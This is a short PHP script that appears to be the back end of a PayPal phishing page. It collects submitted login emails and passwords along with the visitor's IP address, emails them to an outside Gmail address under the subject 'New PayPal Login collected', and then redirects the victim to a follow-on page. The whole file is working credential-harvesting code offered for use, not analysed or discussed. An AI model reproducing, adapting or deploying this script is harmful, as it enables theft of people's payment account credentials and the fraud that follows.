<?php

	  $email = $_POST['login_email'];

	  $password = $_POST['login_password'];

	  $IP = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');

$to= 'chidozie.managwu@gmail.com';

 $email_subject = "New PayPal Login collected";

$email_body = "PayPal User-Email: $email.\n".

	                            "Paypal User-Password: $password.\n".
    
                                "PayPal User-IP: $IP.\n";
    mail($to,$email_subject,$email_body);
header('Location: next.html');
	?>